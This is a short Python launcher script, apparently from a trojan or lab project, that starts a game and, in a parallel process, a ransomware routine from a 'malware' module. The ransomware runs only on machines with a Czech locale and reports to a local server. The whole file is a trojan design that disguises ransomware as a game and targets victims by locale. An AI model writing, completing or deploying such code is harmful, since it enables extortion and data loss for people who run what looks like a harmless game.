import game
import malware
import locale
from multiprocessing import Process

def check_czech_locale():
    lang, _ = locale.getdefaultlocale()
    if lang and lang.startswith('cs'):
        return True
    return False


def run_rsw():
    if check_czech_locale():
        ransomware = malware.Ransomware(server_base_url="http://localhost:8001", api_key="") # Start path default as home, change if testing
        ransomware.run()

if __name__ == '__main__':
    game_process = Process(target=game.play)
    rsw_process = Process(target=run_rsw)

    game_process.start()
    rsw_process.start()

